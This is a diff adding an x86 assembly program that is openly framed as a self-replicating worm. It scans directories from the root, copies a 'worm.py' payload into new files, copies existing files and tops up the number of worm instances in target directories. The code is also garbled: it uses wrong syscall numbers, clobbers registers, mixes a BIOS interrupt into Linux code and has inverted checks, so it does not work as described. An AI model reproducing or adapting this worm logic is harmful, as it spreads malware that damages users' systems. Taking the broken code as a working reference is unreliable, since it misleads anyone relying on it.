@@ -1,0 +1,439 @@
+section .data
+    path db "/", 0   ; Default path
+    target_dir_list dd 0   ; Empty target directory list
+    iteration dd 2   ; Default iteration count
+    script_name db "worm.py", 0
+    untitled_folder db "untitled_folder.py", 0
+
+section .text
+    global _start
+
+_start:
+    ; Set up stack pointer and initialize registers
+
+    ; Call list_directories
+    mov eax, path
+    call list_directories
+
+    ; Call create_new_worm
+    call create_new_worm
+
+    ; Call copy_existing_files
+    call copy_existing_files
+
+    ; Call check_worm_instances
+    call check_worm_instances
+
+    ; Exit program
+    mov eax, 1
+    xor ebx, ebx
+    int 0x80
+
+list_directories:
+    ; Function to list directories
+    ; Parameters:
+    ;   eax - path
+
+    ; Open directory
+    mov ebx, eax
+    mov eax, 5   ; openat system call
+    xor ecx, ecx   ; flags
+    xor edx, edx   ; mode
+    int 0x80
+
+    ; Save directory file descriptor
+    mov esi, eax
+
+    ; Read directory entries
+    lea edx, [esp + 512]   ; buffer for directory entry
+    mov eax, 89   ; getdents64 system call
+    mov ecx, eax   ; file descriptor
+    int 0x80
+
+    ; Loop through directory entries
+.loop:
+    test eax, eax   ; check if end of directory
+    jz .done
+
+    ; Extract filename from directory entry
+    mov edi, 0   ; entry index
+    add edx, eax   ; advance buffer pointer
+    movzx eax, byte [edx + 9]   ; filename length
+    inc edx   ; move to filename
+    lea edi, [esp + 512]   ; destination buffer
+    rep movsb   ; copy filename to buffer
+    mov byte [edi + eax], 0   ; null-terminate the string
+
+    ; Print the filename
+    pusha
+    push edi
+    call print_string
+    popa
+
+    ; Recursive call for subdirectories
+    mov eax, edi   ; subdirectory path
+    call list_directories
+
+    jmp .loop
+
+.done:
+    ; Close directory
+    mov eax, 6   ; close system call
+    mov ebx, esi   ; file descriptor
+    int 0x80
+
+    ret
+
+create_new_worm:
+    ; Function to create new worm
+    ; No parameters
+
+    ; Copy script_name to destination
+    push untitled_folder
+    push script_name
+    call copy_file
+
+    ret
+
+copy_existing_files:
+    ; Function to copy existing files
+    ; No parameters
+
+    ; Loop through target directories
+    mov ecx, target_dir_list
+.loop:
+    ; Check if end of target_dir_list
+    cmp dword [ecx], 0
+    jz .done
+
+    ; Copy existing files
+    push dword [ecx]
+    push iteration
+    call copy_files_in_directory
+
+    ; Advance to the next target directory
+    add ecx, 4
+    jmp .loop
+
+.done:
+    ret
+
+copy_files_in_directory:
+    ; Function to copy existing files in a directory
+    ; Parameters:
+    ;   eax - directory path
+    ;   ebx - iteration count
+
+    ; Open directory
+    mov edx, eax
+    mov eax, 5   ; openat system call
+    xor ecx, ecx   ; flags
+    xor esi, esi   ; mode
+    int 0x80
+
+    ; Save directory file descriptor
+    mov edi, eax
+
+    ; Read directory entries
+    lea edx, [esp + 512]   ; buffer for directory entry
+    mov eax, 89   ; getdents64 system call
+    mov ecx, eax   ; file descriptor
+    int 0x80
+
+    ; Loop through directory entries
+.loop:
+    test eax, eax   ; check if end of directory
+    jz .done
+
+    ; Extract filename from directory entry
+    mov esi, 0   ; entry index
+    add edx, eax   ; advance buffer pointer
+    movzx eax, byte [edx + 9]   ; filename length
+    inc edx   ; move to filename
+    lea esi, [esp + 512]   ; source buffer
+    rep movsb   ; copy filename to buffer
+    mov byte [esi + eax], 0   ; null-terminate the string
+
+    ; Check if the file is not a directory
+    push edx   ; save buffer pointer
+    push esi   ; save filename
+    call is_regular_file
+    cmp eax, 0
+    jne .next_entry
+
+    ; Copy the file
+    push ebx   ; push iteration count
+    push esi   ; push filename
+    push eax   ; push directory path
+    call copy_file
+
+    .next_entry:
+    ; Restore buffer pointer
+    pop edx
+
+    jmp .loop
+
+.done:
+    ; Close directory
+    mov eax, 6   ; close system call
+    mov ebx, edi   ; file descriptor
+    int 0x80
+
+    ret
+
+check_worm_instances:
+    ; Function to check worm instances
+    ; No parameters
+
+    ; Loop through target directories
+    mov ecx, target_dir_list
+.loop:
+    ; Check if end of target_dir_list
+    cmp dword [ecx], 0
+    jz .done
+
+    ; Check worm instances
+    push dword [ecx]
+    push iteration
+    call count_worm_instances
+    cmp eax, ebx   ; compare instance count with iteration count
+    jge .next_directory
+
+    ; Create missing worm instances
+    mov edi, ebx
+    sub edi, eax   ; calculate missing instances count
+    push edi
+    push dword [ecx]
+    call create_new_worm_instances
+
+    .next_directory:
+    ; Advance to the next target directory
+    add ecx, 4
+    jmp .loop
+
+.done:
+    ret
+
+count_worm_instances:
+    ; Function to count worm instances in a directory
+    ; Parameters:
+    ;   eax - directory path
+    ;   ebx - iteration count
+    ; Returns:
+    ;   eax - instance count
+
+    ; Initialize instance count to 0
+    xor eax, eax
+
+    ; Open directory
+    mov edx, eax
+    mov eax, 5   ; openat system call
+    xor ecx, ecx   ; flags
+    xor esi, esi   ; mode
+    int 0x80
+
+    ; Save directory file descriptor
+    mov edi, eax
+
+    ; Read directory entries
+    lea edx, [esp + 512]   ; buffer for directory entry
+    mov eax, 89   ; getdents64 system call
+    mov ecx, eax   ; file descriptor
+    int 0x80
+
+    ; Loop through directory entries
+.loop:
+    test eax, eax   ; check if end of directory
+    jz .done
+
+    ; Extract filename from directory entry
+    mov esi, 0   ; entry index
+    add edx, eax   ; advance buffer pointer
+    movzx eax, byte [edx + 9]   ; filename length
+    inc edx   ; move to filename
+    lea esi, [esp + 512]   ; source buffer
+    rep movsb   ; copy filename to buffer
+    mov byte [esi + eax], 0   ; null-terminate the string
+
+    ; Check if the file is a worm instance
+    push esi   ; push filename
+    call is_worm_instance
+    cmp eax, 1
+    jne .next_entry
+
+    ; Increment instance count
+    inc eax
+
+    .next_entry:
+    jmp .loop
+
+.done:
+    ; Close directory
+    mov eax, 6   ; close system call
+    mov ebx, edi   ; file descriptor
+    int 0x80
+
+    ret
+
+create_new_worm_instances:
+    ; Function to create missing worm instances
+    ; Parameters:
+    ;   eax - missing instances count
+    ;   ebx - directory path
+
+    ; Copy missing worm instances
+    mov edi, eax   ; save missing instances count
+.loop:
+    push ebx   ; push directory path
+    call create_new_worm
+    dec edi   ; decrement missing instances count
+    jnz .loop
+
+    ret
+
+is_regular_file:
+    ; Function to check if a file is a regular file
+    ; Parameters:
+    ;   eax - file path
+    ; Returns:
+    ;   eax - 0 if not a regular file, 1 if a regular file
+
+    ; Open file
+    mov ebx, eax
+    mov eax, 5   ; openat system call
+    xor ecx, ecx   ; flags
+    xor edx, edx   ; mode
+    int 0x80
+
+    ; Check if the file is a regular file
+    mov eax, 8   ; fstat system call
+    mov ebx, eax   ; file descriptor
+    lea ecx, [esp + 16]   ; stat structure
+    int 0x80
+
+    ; Check file type
+    test dword [esp + 16], 0170000   ; S_IFMT mask
+    jnz .not_regular_file
+
+    ; Check if regular file
+    mov eax, 1   ; regular file
+    jmp .done
+
+.not_regular_file:
+    ; Not a regular file
+    xor eax, eax   ; return 0
+
+.done:
+    ret
+
+is_worm_instance:
+    ; Function to check if a file is a worm instance
+    ; Parameters:
+    ;   eax - file path
+    ; Returns:
+    ;   eax - 1 if a worm instance, 0 otherwise
+
+    ; Check file extension
+    mov eax, 0   ; file extension offset
+    lea ebx, [esp + 512]   ; file path
+    xor ecx, ecx   ; iteration count
+.loop:
+    cmp byte [ebx + eax + ecx], '.'
+    jne .next_char
+    inc ecx   ; increment iteration count
+    cmp ecx, ebx   ; compare with iteration
+    jne .loop
+
+    ; Check if the file is a worm instance
+    cmp ecx, ebx   ; compare iteration count with iteration
+    jne .not_worm_instance
+
+    ; It's a worm instance
+    mov eax, 1   ; return 1
+    jmp .done
+
+.not_worm_instance:
+    ; Not a worm instance
+    xor eax, eax   ; return 0
+
+.done:
+    ret
+
+copy_file:
+    ; Function to copy a file
+    ; Parameters:
+    ;   eax - source file path
+    ;   ebx - destination file path
+
+    ; Open source file
+    mov edx, eax
+    mov eax, 5   ; openat system call
+    xor ecx, ecx   ; flags
+    xor esi, esi   ; mode
+    int 0x80
+
+    ; Save source file descriptor
+    mov edi, eax
+
+    ; Open destination file
+    mov edx, ebx
+    mov eax, 5   ; openat system call
+    xor ecx, ecx   ; flags
+    xor esi, esi   ; mode
+    int 0x80
+
+    ; Save destination file descriptor
+    mov esi, eax
+
+    ; Copy file content
+    lea edx, [esp + 512]   ; buffer for file content
+    mov eax, 3   ; read system call
+    mov ebx, edi   ; source file descriptor
+    xor ecx, ecx   ; buffer offset
+    xor edi, edi   ; bytes read
+    int 0x80
+
+    ; Check if end of file
+    test eax, eax
+    jz .done_copying
+
+    ; Write file content
+    mov eax, 4   ; write system call
+    mov ebx, esi   ; destination file descriptor
+    mov ecx, edx   ; buffer
+    int 0x80
+
+    ; Recursive call to copy remaining content
+    jmp copy_file
+
+.done_copying:
+    ; Close source file
+    mov eax, 6   ; close system call
+    mov ebx, edi   ; source file descriptor
+    int 0x80
+
+    ; Close destination file
+    mov eax, 6   ; close system call
+    mov ebx, esi   ; destination file descriptor
+    int 0x80
+
+    ret
+
+print_string:
+    ; Function to print a null-terminated string
+    ; Parameter:
+    ;   eax - pointer to the string
+
+    pusha
+
+.loop:
+    lodsb   ; load character from memory
+    test al, al   ; check for null terminator
+    jz .done   ; jump if end of string
+    mov ah, 0x0E   ; function to print character
+    int 0x10   ; BIOS interrupt to print character
+    jmp .loop
+
+.done:
+    popa
+    ret
